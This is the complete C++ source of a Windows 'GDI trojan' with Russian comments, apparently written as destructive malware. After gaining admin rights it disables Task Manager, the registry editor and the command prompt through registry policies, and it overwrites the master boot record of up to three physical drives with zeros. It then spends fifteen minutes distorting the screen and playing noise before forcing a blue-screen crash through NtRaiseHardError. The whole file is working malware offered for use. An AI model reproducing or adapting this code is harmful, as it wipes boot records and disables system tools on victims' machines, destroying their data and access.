// gdi_trojan_ultimate.cpp
#define _WIN32_WINNT 0x0601
#define WINVER 0x0601

#include <windows.h>
#include <winuser.h>
#include <math.h>
#include <mmsystem.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <vector>
#include <thread>
#include <chrono>
#include <algorithm>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "msimg32.lib")

using namespace std;

// ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================
int screenWidth = 0;
int screenHeight = 0;
bool isRunning = true;
int comboIntensity = 0;

// ==================== ПРОТОТИПЫ ====================
bool IsAdmin();
void RunAsAdmin();
void OverwriteMBR();
void GenerateSound(int freq, int duration);
void PlayRandomSounds();
void TriggerBSOD();
void RunGDIEffects();
void BlockSystem();

// ==================== БЛОКИРОВКА СИСТЕМЫ ====================
void BlockSystem() {
    // Блокировка диспетчера задач
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegSetValueEx(hKey, "DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegSetValueEx(hKey, "DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    
    // Блокировка редактора реестра
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    
    // Блокировка CMD
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
        "Software\\Policies\\Microsoft\\Windows\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 2;
        RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

// ==================== МЕГА-АГРЕССИВНЫЕ ЭФФЕКТЫ (20 шт) ====================

// 1. КАША ИЗ ПИКСЕЛЕЙ - полный хаос
void Effect1(HDC hdc, int w, int h) {
    int size = w * h;
    COLORREF* pixels = new COLORREF[size];
    for (int i = 0; i < size; i++) {
        int r = rand() % 256;
        int g = rand() % 256;
        int b = rand() % 256;
        pixels[i] = RGB(r ^ (rand() % 255), g ^ (rand() % 255), b ^ (rand() % 255));
    }
    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
    HDC mdc = CreateCompatibleDC(hdc);
    SelectObject(mdc, bmp);
    BitBlt(hdc, 0, 0, w, h, mdc, rand() % 30 - 15, rand() % 30 - 15, SRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
    delete[] pixels;
}

// 2. RGB АД - мега-инверсия с цветами
void Effect2(HDC hdc, int w, int h) {
    static int phase = 0;
    phase += 5;
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (int y = 0; y < h; y += 2) {
        for (int x = 0; x < w; x += 2) {
            int color = (phase + x + y * 2) % 360;
            SetPixel(hdc, x, y, RGB(
                (int)(255 * sin(color * 3.14159 / 180 + phase)),
                (int)(255 * sin((color + 120) * 3.14159 / 180 + phase * 0.7)),
                (int)(255 * sin((color + 240) * 3.14159 / 180 + phase * 1.3))
            ));
        }
    }
    BitBlt(hdc, 0, 0, w, h, mdc, rand() % 20 - 10, rand() % 20 - 10, NOTSRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 3. ПОЛНАЯ ТРЯСКА С РАЗРЫВАМИ
void Effect3(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (int y = 0; y < h; y += 2) {
        int offset = (rand() % 40 - 20) * (1 + sin(y * 0.05) * 2);
        BitBlt(hdc, offset, y, w, 2, mdc, 0, y, SRCCOPY);
        BitBlt(hdc, -offset/2, y+1, w, 1, mdc, 0, y+1, SRCCOPY);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 4. СМЕЩЕНИЕ С НАЛОЖЕНИЕМ
void Effect4(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    int shiftX = rand() % 80 - 40;
    int shiftY = rand() % 80 - 40;
    BitBlt(hdc, shiftX, shiftY, w, h, mdc, 0, 0, SRCCOPY);
    BitBlt(hdc, -shiftX/2, -shiftY/2, w, h, mdc, 0, 0, SRCCOPY);
    BitBlt(hdc, shiftX/3, shiftY/3, w, h, mdc, 0, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 5. ИСКРИВЛЕНИЕ ЭКРАНА (волны с разрывами)
void Effect5(HDC hdc, int w, int h) {
    static int phase = 0;
    phase += 3;
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (int y = 0; y < h; y++) {
        int offsetX = (int)(40 * sin(y * 0.03 + phase * 0.1)) + (int)(20 * sin(y * 0.07 + phase * 0.15));
        int offsetY = (int)(30 * cos(y * 0.04 + phase * 0.08));
        BitBlt(hdc, offsetX, y + offsetY, w, 1, mdc, 0, y, SRCCOPY);
        BitBlt(hdc, -offsetX/2, y - offsetY/2, w/2, 1, mdc, w/2, y, SRCCOPY);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 6. РАЗРЫВ ЭКРАНА НА БЛОКИ
void Effect6(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    int blockSize = 10 + rand() % 30;
    for (int x = 0; x < w; x += blockSize) {
        for (int y = 0; y < h; y += blockSize) {
            int dx = rand() % 80 - 40;
            int dy = rand() % 80 - 40;
            BitBlt(hdc, x + dx, y + dy, blockSize, blockSize, mdc, x, y, SRCCOPY);
            // Смешивание цветов в блоках
            if (rand() % 3 == 0) {
                BitBlt(hdc, x + dx/2, y + dy/2, blockSize/2, blockSize/2, mdc, x, y, NOTSRCCOPY);
            }
        }
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 7. МАЗУХА (смешивание с отрицанием)
void Effect7(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    int offset = rand() % 100 - 50;
    BitBlt(hdc, offset, 0, w, h, mdc, 0, 0, SRCCOPY);
    BitBlt(hdc, -offset/2, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
    BitBlt(hdc, 0, offset/3, w, h, mdc, 0, 0, SRCPAINT);
    BitBlt(hdc, 0, -offset/3, w, h, mdc, 0, 0, SRCAND);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 8. ГИПЕР-ИНВЕРСИЯ
void Effect8(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (int i = 0; i < 3; i++) {
        int offX = rand() % 60 - 30;
        int offY = rand() % 60 - 30;
        BitBlt(hdc, offX, offY, w, h, mdc, 0, 0, NOTSRCCOPY);
        BitBlt(hdc, -offX, -offY, w, h, mdc, 0, 0, NOTSRCCOPY);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 9. СИНУСОИДНЫЙ РАЗРЫВ
void Effect9(HDC hdc, int w, int h) {
    static int phase = 0;
    phase += 2;
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (int x = 0; x < w; x += 2) {
        int yOffset = (int)(50 * sin(x * 0.02 + phase * 0.05)) + (int)(30 * sin(x * 0.05 + phase * 0.1));
        for (int y = 0; y < h; y += 4) {
            BitBlt(hdc, x + (int)(20 * sin(y * 0.03 + phase * 0.07)), y + yOffset, 4, 4, mdc, x, y, SRCCOPY);
        }
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 10. РАДУЖНЫЙ ШУМ
void Effect10(HDC hdc, int w, int h) {
    static int phase = 0;
    phase += 3;
    int size = w * h;
    COLORREF* pixels = new COLORREF[size];
    for (int i = 0; i < size; i++) {
        int x = i % w, y = i / w;
        int color = (phase + x * 2 + y * 3 + rand() % 20) % 360;
        pixels[i] = RGB(
            (int)(255 * sin(color * 3.14159 / 180 + phase * 0.5)),
            (int)(255 * sin((color + 120) * 3.14159 / 180 + phase * 0.7)),
            (int)(255 * sin((color + 240) * 3.14159 / 180 + phase * 0.3))
        );
    }
    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
    HDC mdc = CreateCompatibleDC(hdc);
    SelectObject(mdc, bmp);
    BitBlt(hdc, rand() % 20 - 10, rand() % 20 - 10, w, h, mdc, 0, 0, SRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
    delete[] pixels;
}

// 11. ЗЕРКАЛЬНЫЙ АД
void Effect11(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    int midX = w / 2, midY = h / 2;
    BitBlt(hdc, 0, 0, midX, h, mdc, w - midX, 0, SRCCOPY);
    BitBlt(hdc, midX, 0, midX, h, mdc, 0, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, midY, mdc, 0, h - midY, SRCCOPY);
    BitBlt(hdc, 0, midY, w, midY, mdc, 0, 0, SRCCOPY);
    
    // Инвертируем некоторые части
    BitBlt(hdc, midX/2, midY/2, midX/2, midY/2, mdc, 0, 0, NOTSRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 12. ХАОТИЧЕСКИЕ ЛИНИИ
void Effect12(HDC hdc, int w, int h) {
    for (int i = 0; i < 500; i++) {
        HPEN pen = CreatePen(PS_SOLID, rand() % 10 + 1, RGB(rand() % 256, rand() % 256, rand() % 256));
        SelectObject(hdc, pen);
        MoveToEx(hdc, rand() % w, rand() % h, NULL);
        LineTo(hdc, rand() % w, rand() % h);
        DeleteObject(pen);
    }
}

// 13. РАЗРЫВ НА ПОЛОСЫ
void Effect13(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (int i = 0; i < 50; i++) {
        int y = rand() % h;
        int height = 5 + rand() % 20;
        int offset = rand() % 200 - 100;
        BitBlt(hdc, offset, y, w, height, mdc, 0, y, SRCCOPY);
        BitBlt(hdc, -offset/2, y + height, w/2, height/2, mdc, w/2, y, NOTSRCCOPY);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 14. МЕГА-СПИРАЛЬ
void Effect14(HDC hdc, int w, int h) {
    static int phase = 0;
    phase += 2;
    int cx = w / 2, cy = h / 2;
    HPEN pen = CreatePen(PS_SOLID, 3, RGB(rand() % 256, rand() % 256, rand() % 256));
    SelectObject(hdc, pen);
    MoveToEx(hdc, cx, cy, NULL);
    for (int i = 0; i < 300; i++) {
        double angle = i * 0.05 + phase * 0.02;
        int radius = i * 2;
        int x = cx + (int)(radius * cos(angle));
        int y = cy + (int)(radius * sin(angle));
        LineTo(hdc, x, y);
        if (i % 10 == 0) {
            DeleteObject(pen);
            pen = CreatePen(PS_SOLID, 2 + rand() % 5, RGB(rand() % 256, rand() % 256, rand() % 256));
            SelectObject(hdc, pen);
        }
    }
    DeleteObject(pen);
}

// 15. ВЗРЫВ ПИКСЕЛЕЙ
void Effect15(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    int cx = w / 2 + rand() % 200 - 100;
    int cy = h / 2 + rand() % 200 - 100;
    int radius = 50 + rand() % 200;
    
    for (int x = 0; x < w; x += 2) {
        for (int y = 0; y < h; y += 2) {
            int dx = x - cx, dy = y - cy;
            int dist = (int)sqrt(dx*dx + dy*dy);
            if (dist < radius) {
                int offset = (int)((radius - dist) * 0.5);
                int nx = x + (dx * offset / (dist + 1));
                int ny = y + (dy * offset / (dist + 1));
                BitBlt(hdc, nx, ny, 2, 2, mdc, x, y, SRCCOPY);
            }
        }
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 16. ТРОЙНАЯ ИНВЕРСИЯ
void Effect16(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    BitBlt(hdc, 0, 0, w/3, h, mdc, 0, 0, NOTSRCCOPY);
    BitBlt(hdc, w/3, 0, w/3, h, mdc, w/3, 0, NOTSRCCOPY);
    BitBlt(hdc, 2*w/3, 0, w/3, h, mdc, 2*w/3, 0, NOTSRCCOPY);
    
    BitBlt(hdc, 0, h/3, w, h/3, mdc, 0, h/3, NOTSRCCOPY);
    BitBlt(hdc, 0, 2*h/3, w, h/3, mdc, 0, 2*h/3, NOTSRCCOPY);
    
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 17. КАЛЕЙДОСКОП
void Effect17(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    int segments = 6 + rand() % 6;
    for (int i = 0; i < segments; i++) {
        double angle = 2 * 3.14159 * i / segments;
        int cx = w / 2, cy = h / 2;
        int x1 = cx + (int)(w * cos(angle));
        int y1 = cy + (int)(h * sin(angle));
        int x2 = cx + (int)(w * cos(angle + 3.14159 / segments));
        int y2 = cy + (int)(h * sin(angle + 3.14159 / segments));
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 256, rand() % 256, rand() % 256));
        SelectObject(hdc, pen);
        MoveToEx(hdc, cx, cy, NULL);
        LineTo(hdc, x1, y1);
        LineTo(hdc, x2, y2);
        LineTo(hdc, cx, cy);
        DeleteObject(pen);
    }
    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 18. РАЗРЫВ НА КВАДРАТЫ (жесткий)
void Effect18(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    int blockSize = 5 + rand() % 15;
    for (int x = 0; x < w; x += blockSize) {
        for (int y = 0; y < h; y += blockSize) {
            int dx = rand() % 60 - 30;
            int dy = rand() % 60 - 30;
            if (rand() % 2) {
                BitBlt(hdc, x + dx, y + dy, blockSize, blockSize, mdc, x, y, NOTSRCCOPY);
            } else {
                BitBlt(hdc, x + dx, y + dy, blockSize, blockSize, mdc, x, y, SRCCOPY);
            }
            if (rand() % 3 == 0) {
                BitBlt(hdc, x - dx/2, y - dy/2, blockSize/2, blockSize/2, mdc, x, y, SRCAND);
            }
        }
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 19. БЕЛЫЙ ШУМ + ИНВЕРСИЯ
void Effect19(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (int i = 0; i < w * h; i += 3) {
        int x = i % w, y = i / w;
        if (rand() % 2) {
            SetPixel(hdc, x, y, RGB(255, 255, 255));
        } else {
            SetPixel(hdc, x, y, RGB(0, 0, 0));
        }
    }
    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 20. РАЗРЫВ С ГРАДИЕНТОМ
void Effect20(HDC hdc, int w, int h) {
    static int phase = 0;
    phase += 3;
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (int y = 0; y < h; y += 2) {
        int offset = (int)(50 * sin(y * 0.03 + phase * 0.08)) + (int)(30 * sin(y * 0.07 + phase * 0.12));
        int color = (phase + y * 2) % 360;
        HPEN pen = CreatePen(PS_SOLID, 2, RGB(
            (int)(255 * sin(color * 3.14159 / 180)),
            (int)(255 * sin((color + 120) * 3.14159 / 180)),
            (int)(255 * sin((color + 240) * 3.14159 / 180))
        ));
        SelectObject(hdc, pen);
        MoveToEx(hdc, offset, y, NULL);
        LineTo(hdc, w + offset/2, y);
        DeleteObject(pen);
        BitBlt(hdc, offset/3, y, w/2, 2, mdc, 0, y, NOTSRCCOPY);
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// ==================== МАССИВ ВСЕХ ЭФФЕКТОВ ====================
typedef void (*EffectFunc)(HDC, int, int);
EffectFunc effects[] = {
    Effect1, Effect2, Effect3, Effect4, Effect5,
    Effect6, Effect7, Effect8, Effect9, Effect10,
    Effect11, Effect12, Effect13, Effect14, Effect15,
    Effect16, Effect17, Effect18, Effect19, Effect20
};
int numEffects = sizeof(effects) / sizeof(effects[0]);

// ==================== АДМИН ====================
bool IsAdmin() {
    BOOL b = FALSE;
    PSID pAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmin)) {
        CheckTokenMembership(NULL, pAdmin, &b);
        FreeSid(pAdmin);
    }
    return b;
}

void RunAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    SHELLEXECUTEINFOA sei = {sizeof(sei)};
    sei.lpVerb = "runas";
    sei.lpFile = path;
    sei.nShow = SW_HIDE;
    ShellExecuteExA(&sei);
    ExitProcess(0);
}

// ==================== MBR ====================
void OverwriteMBR() {
    for (int drive = 0; drive < 3; drive++) {
        char path[32];
        sprintf(path, "\\\\.\\PhysicalDrive%d", drive);
        HANDLE hDrive = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDrive != INVALID_HANDLE_VALUE) {
            BYTE mbrData[512];
            memset(mbrData, 0x00, 512);
            mbrData[510] = 0x00;
            mbrData[511] = 0x00;
            DWORD bytesWritten = 0;
            WriteFile(hDrive, mbrData, 512, &bytesWritten, NULL);
            SetFilePointer(hDrive, 512, NULL, FILE_BEGIN);
            WriteFile(hDrive, mbrData, 512, &bytesWritten, NULL);
            CloseHandle(hDrive);
        }
    }
}

// ==================== ЗВУК ====================
void GenerateSound(int freq, int duration) {
    if (freq < 20 || freq > 20000) freq = 440;
    if (duration < 10) duration = 10;
    int samples = duration * 44100 / 1000;
    short* buffer = new short[samples];
    for (int i = 0; i < samples; i++) {
        double t = (double)i / 44100.0;
        double wave = sin(2.0 * 3.14159 * freq * t);
        wave += 0.3 * sin(2.0 * 3.14159 * freq * 2.5 * t);
        wave += 0.15 * sin(2.0 * 3.14159 * freq * 0.5 * t);
        buffer[i] = (short)(wave * 16000);
    }
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wf = {WAVE_FORMAT_PCM, 1, 44100, 88200, 2, 16, 0};
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        delete[] buffer;
        return;
    }
    WAVEHDR wh = {0};
    wh.lpData = (LPSTR)buffer;
    wh.dwBufferLength = samples * 2;
    wh.dwFlags = 0;
    waveOutPrepareHeader(hWaveOut, &wh, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &wh, sizeof(WAVEHDR));
    Sleep(duration + 20);
    waveOutUnprepareHeader(hWaveOut, &wh, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

void PlayRandomSounds() {
    srand(GetTickCount());
    thread soundThread([]() {
        while (isRunning) {
            int freq = 50 + (rand() % 5000);
            int duration = 30 + (rand() % 400);
            GenerateSound(freq, duration);
            Sleep(50 + rand() % 500);
        }
    });
    soundThread.detach();
}

// ==================== BSOD ====================
void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        typedef NTSTATUS (NTAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
        if (NtRaiseHardError) {
            NtRaiseHardError(0xC0000022, 0, 0, NULL, 1, NULL);
        }
    }
    volatile int* p = NULL;
    *p = 0xDEADBEEF;
}

// ==================== ЗАПУСК ЭФФЕКТОВ С МЕГА-КОМБИНАЦИЯМИ ====================
void RunGDIEffects() {
    screenWidth = GetSystemMetrics(SM_CXSCREEN);
    screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    if (!hdc) return;
    
    vector<int> effectOrder;
    for (int i = 0; i < numEffects; i++) effectOrder.push_back(i);
    random_shuffle(effectOrder.begin(), effectOrder.end());
    
    time_t startTime = time(NULL);
    time_t endTime = startTime + 15 * 60;
    int effectIndex = 0;
    comboIntensity = 1;
    
    while (time(NULL) < endTime && isRunning) {
        // Увеличиваем интенсивность со временем
        comboIntensity = 1 + (int)((time(NULL) - startTime) / 60.0);
        if (comboIntensity > 5) comboIntensity = 5;
        
        // Количество эффектов в комбинации растет со временем (1-5)
        int comboSize = 2 + (rand() % (comboIntensity + 1));
        
        // 70% шанс на комбо-режим (вместо 50%)
        if (rand() % 100 < 70) {
            HDC mdc = CreateCompatibleDC(hdc);
            HBITMAP bmp = CreateCompatibleBitmap(hdc, screenWidth, screenHeight);
            SelectObject(mdc, bmp);
            BitBlt(mdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);
            
            // Применяем несколько эффектов подряд с наложением
            for (int i = 0; i < comboSize; i++) {
                int idx = effectOrder[(effectIndex + i) % numEffects];
                effects[idx](hdc, screenWidth, screenHeight);
                
                // Звуки для каждого эффекта
                if (rand() % 2 == 0) {
                    GenerateSound(50 + rand() % 5000, 20 + rand() % 150);
                }
                
                Sleep(10 + rand() % 20);
            }
            
            // Жесткое наложение
            int blendMode = rand() % 4;
            if (blendMode == 0) {
                // Инверсия
                BitBlt(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, NOTSRCCOPY);
            } else if (blendMode == 1) {
                // XOR
                BitBlt(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, SRCINVERT);
            } else if (blendMode == 2) {
                // Наложение с прозрачностью
                BLENDFUNCTION bf = {AC_SRC_OVER, 0, 100 + rand() % 100, 0};
                AlphaBlend(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, screenWidth, screenHeight, bf);
            } else {
                // Смешивание с паттерном
                PatBlt(hdc, 0, 0, screenWidth, screenHeight, PATINVERT);
                BitBlt(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, SRCCOPY);
            }
            
            DeleteDC(mdc);
            DeleteObject(bmp);
            
            effectIndex += comboSize;
        } else {
            // Одиночный эффект
            int idx = effectOrder[effectIndex % numEffects];
            effects[idx](hdc, screenWidth, screenHeight);
            
            if (rand() % 3 == 0) {
                GenerateSound(50 + rand() % 6000, 20 + rand() % 200);
            }
            
            effectIndex++;
        }
        
        // Частое перемешивание (каждые 3-8 эффектов)
        if (rand() % 10 == 0) {
            random_shuffle(effectOrder.begin(), effectOrder.end());
        }
        
        Sleep(20 + rand() % 80);
    }
    
    ReleaseDC(0, hdc);
}

// ==================== ТОЧКА ВХОДА ====================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsAdmin()) { RunAsAdmin(); return 0; }
    srand(GetTickCount());
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Блокируем систему
    BlockSystem();
    
    // Перезаписываем MBR
    OverwriteMBR();
    
    // Запускаем звуки
    PlayRandomSounds();
    
    // Запускаем GDI эффекты
    thread gdiThread(RunGDIEffects);
    Sleep(15 * 60 * 1000);
    
    isRunning = false;
    gdiThread.join();
    Sleep(1000);
    TriggerBSOD();
    return 0;
}
